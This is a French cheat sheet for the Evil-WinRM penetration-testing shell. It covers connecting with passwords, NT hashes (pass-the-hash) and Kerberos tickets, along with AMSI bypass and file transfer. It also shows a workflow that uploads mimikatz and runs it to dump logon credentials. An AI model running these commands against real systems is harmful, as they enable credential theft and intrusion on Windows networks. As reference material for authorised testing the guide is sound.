# 😈 Evil-WinRM — console Windows à distance

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███████╗██╗   ██╗██╗██╗      ██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗
  ██╔════╝██║   ██║██║██║      ██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
  █████╗  ██║   ██║██║██║█████╗██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
  ██╔══╝  ╚██╗ ██╔╝██║██║╚════╝██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
  ███████╗ ╚████╔╝ ██║███████╗ ╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
                 La console WinRM polyvalente
```

<p align="center">
  <img src="https://img.shields.io/badge/Evil--WinRM-Windows_Shell-red?style=for-the-badge" alt="Evil-WinRM">
  <img src="https://img.shields.io/badge/WinRM-5985%2F5986-blue?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 Table des matières

- [Qu’est-ce qu’Evil-WinRM ?](#-quest-ce-quevil-winrm-)
- [Installation](#-installation)
- [Connexion de base](#-connexion-de-base)
- [Opérations sur les fichiers](#-opérations-sur-les-fichiers)
- [Commandes intégrées](#-commandes-intégrées)
- [Pass-the-Hash](#-pass-the-hash)
- [Authentification Kerberos](#-authentification-kerberos)
- [Référence rapide](#-référence-rapide)
- [Ressources](#-ressources)

---

## 🎯 Qu’est-ce qu’Evil-WinRM ?

**Evil-WinRM** est une console WinRM proposant des fonctions pour les tests d’intrusion :

- 🖥️ **Console interactive** — Session PowerShell complète
- 📁 **Transfert de fichiers** — Envoyer et télécharger des fichiers
- 🔓 **Pass-the-Hash** — Authentification avec une empreinte NT
- 🎫 **Kerberos** — Authentification par tickets
- 🧩 **Modules** — Charger des scripts PowerShell

### Ports WinRM

> **Précision :** service, droits et configuration doivent permettre l’accès. HTTP ne signifie pas forcément messages en clair : WinRM peut chiffrer les échanges après authentification NTLM/Kerberos ([Microsoft](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/winrm-security)).

| Port | Protocole | Remarques |
|------|----------|-------|
| 5985 | HTTP | Par défaut |
| 5986 | HTTPS | Chiffrement TLS |

---

## 🚀 Installation

### Kali Linux

```bash
# Installer
sudo apt update
sudo apt install evil-winrm

# Ou avec gem
sudo gem install evil-winrm
```

### Depuis GitHub

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
ruby evil-winrm.rb --help
```

---

## 💻 Connexion de base

### Authentification par mot de passe

> **Version des exemples :** le parseur actuel ne définit pas `-d` comme option de domaine. Les lignes et le tableau historiques sont conservés. Un numéro de port seul n’active pas TLS ; `-S` choisit le transport HTTPS ([source officielle](https://github.com/Hackplayers/evil-winrm/blob/master/evil-winrm.rb)).

```bash
# Connexion de base
evil-winrm -i 10.10.10.10 -u user -p 'password'

# Préciser le domaine
evil-winrm -i 10.10.10.10 -u user -p 'password' -d domain.local

# HTTPS (port 5986)
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Préciser le port
evil-winrm -i 10.10.10.10 -u user -p 'password' -P 5986
```

### Options SSL

> **Précision :** le client cité désactive la vérification du certificat du serveur ; TLS ne garantit donc pas ici la validation de l’identité du serveur. `-c` et `-k` concernent l’authentification par certificat client, pas une simple vérification du certificat serveur ([source officielle](https://github.com/Hackplayers/evil-winrm/blob/master/evil-winrm.rb)).

```bash
# SSL sans vérification du certificat
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Avec un certificat
evil-winrm -i 10.10.10.10 -u user -p 'password' -S -c cert.pem -k key.pem
```

---

## 📁 Opérations sur les fichiers

### Envoyer des fichiers

```bash
# Dans la console Evil-WinRM
*Evil-WinRM* PS C:\> upload /local/path/file.exe

# Envoyer vers un emplacement précis
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe

# Depuis la ligne de commande (avec -e)
evil-winrm -i 10.10.10.10 -u user -p pass -e /path/to/executables
```

### Télécharger des fichiers

```bash
# Télécharger un fichier
*Evil-WinRM* PS C:\> download C:\Users\admin\Desktop\flag.txt

# Télécharger vers un emplacement précis
*Evil-WinRM* PS C:\> download C:\secrets.txt /local/path/secrets.txt
```

### Répertoire des exécutables

> **Correction de l’original :** `-e` désigne le répertoire local utilisé par les fonctions de chargement d’assemblies .NET (unités de code compilé) ; ce n’est pas un sélecteur automatique pour `upload`. Les chemins locaux et distants des transferts restent distincts ([documentation](https://github.com/Hackplayers/evil-winrm#basic-commands)).

```bash
# Préciser le répertoire des exécutables pour l’envoi
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/tools/

# Dans la console, envoyer un exécutable depuis ce répertoire
*Evil-WinRM* PS C:\> upload mimikatz.exe
```

---

<a id="-commandes-intégrées"></a>
## 🛠️ Commandes intégrées

### Menu

```bash
# Afficher toutes les commandes
*Evil-WinRM* PS C:\> menu

# Commandes disponibles :
Bypass-4MSI       - Contourner AMSI
Dll-Loader        - Charger une DLL en mémoire
Donut-Loader      - Charger un assembly .NET, selon l’original
Invoke-Binary     - Exécuter un binaire
services          - Lister les services
upload            - Envoyer un fichier
download          - Télécharger un fichier
```

### Contournement d’AMSI

> **Précision :** AMSI est une interface d’analyse antimalware. La fonction présentée ne garantit pas l’exécution de tout outil détecté : version, protections et droits restent déterminants. Le commentaire anglais était trop général ([fonction documentée](https://github.com/Hackplayers/evil-winrm#advanced-commands)).

```bash
# Contourner AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# Il devient alors possible d’exécuter des outils détectés par l’antivirus, selon l’original
```

### Charger des scripts

```bash
# Se connecter avec le répertoire des scripts
evil-winrm -i 10.10.10.10 -u user -p pass -s /opt/scripts/

# Dans la console, charger le script
*Evil-WinRM* PS C:\> PowerView.ps1

# Utiliser les fonctions du script
*Evil-WinRM* PS C:\> Get-DomainUser
```

### Exécuter des binaires

> **Précision :** `menu` charge les fonctions avancées. `Invoke-Binary` vise les assemblies .NET, pas tout exécutable natif tel qu’une version native de Mimikatz. `Donut-Loader` attend des payloads Donut ; le tableau du menu est simplifié ([documentation](https://github.com/Hackplayers/evil-winrm#advanced-commands)).

```bash
# Charger le répertoire des exécutables
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/bin/

# Exécuter le binaire en mémoire
*Evil-WinRM* PS C:\> Invoke-Binary /opt/bin/mimikatz.exe

# Avec des arguments
*Evil-WinRM* PS C:\> Invoke-Binary mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"
```

### Chargement de DLL

```bash
# Charger une DLL
*Evil-WinRM* PS C:\> Dll-Loader -path C:\path\to\dll
```

### Services

```bash
# Lister les services
*Evil-WinRM* PS C:\> services
```

---

## 🔓 Pass-the-Hash

### Empreinte NTLM

> **Correction de l’original :** le parseur actuel attend une empreinte NT de 32 caractères hexadécimaux pour `-H`, pas une paire LM:NT. Les deux empreintes et les commandes originales restent inchangées ; leur présence ne garantit pas l’authentification ([validation officielle](https://github.com/Hackplayers/evil-winrm/blob/master/evil-winrm.rb)).

```bash
# Se connecter avec une empreinte
evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Uniquement la partie NTLM
evil-winrm -i 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Avec le domaine
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH -d domain.local
```

---

## 🎫 Authentification Kerberos

### Préparation

```bash
# Faire pointer KRB5CCNAME vers le cache de tickets
export KRB5CCNAME=/path/to/ticket.ccache

# Adapter /etc/krb5.conf au royaume Kerberos
```

### Se connecter avec Kerberos

> **Précision :** Kerberos dépend du royaume, du nom DNS/SPN et d’un cache compatible. Les noms et chemins sont des exemples ; ils ne suffisent pas à rendre un ticket valable pour toute cible ([projet officiel](https://github.com/Hackplayers/evil-winrm#kerberos)).

```bash
# Authentification Kerberos
evil-winrm -i dc01.domain.local -r domain.local

# Avec un cache ccache précis
KRB5CCNAME=admin.ccache evil-winrm -i dc01.domain.local -r domain.local
```

---

## 📊 Référence rapide

### Options de connexion

| Option | Description |
|--------|-------------|
| `-i` | Adresse IP ou nom d’hôte cible |
| `-u` | Nom d’utilisateur |
| `-p` | Mot de passe |
| `-H` | Empreinte NTLM |
| `-d` | Domaine, selon le texte original |
| `-S` | Utiliser SSL/TLS (HTTPS) |
| `-P` | Port |
| `-r` | Royaume Kerberos (realm) |

### Options des fichiers

| Option | Description |
|--------|-------------|
| `-s` | Répertoire des scripts |
| `-e` | Répertoire des exécutables |
| `-c` | Certificat SSL/TLS |
| `-k` | Clé SSL/TLS |

### Commandes de la console

| Commande | Description |
|---------|-------------|
| `upload` | Envoyer un fichier |
| `download` | Télécharger un fichier |
| `menu` | Afficher les commandes |
| `Bypass-4MSI` | Contourner AMSI |
| `Invoke-Binary` | Exécuter un programme en mémoire |
| `services` | Lister les services |
| `Dll-Loader` | Charger une DLL |

### Déroulement habituel

```bash
# 1. Se connecter
evil-winrm -i 10.10.10.10 -u admin -p 'P@ssw0rd'

# 2. Contourner AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. Envoyer les outils
*Evil-WinRM* PS C:\> upload /opt/tools/mimikatz.exe

# 4. Exécuter
*Evil-WinRM* PS C:\> .\mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"

# 5. Télécharger les résultats
*Evil-WinRM* PS C:\> download C:\results.txt
```

---

## 📚 Ressources

- [Evil-WinRM sur GitHub](https://github.com/Hackplayers/evil-winrm)
- [Documentation WinRM](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)

### Aide-mémoire associés
- [CrackMapExec](../../CrackMapExec/translations/README.fr.md)
- [Impacket](../../Impacket/translations/README.fr.md)
- [Mimikatz](../../Mimikatz/translations/README.fr.md)

---

<p align="center">
  <b>😈 La console WinRM polyvalente !</b><br>
  <i>Evil-WinRM — une console pour les tests d’intrusion Windows</i>
</p>
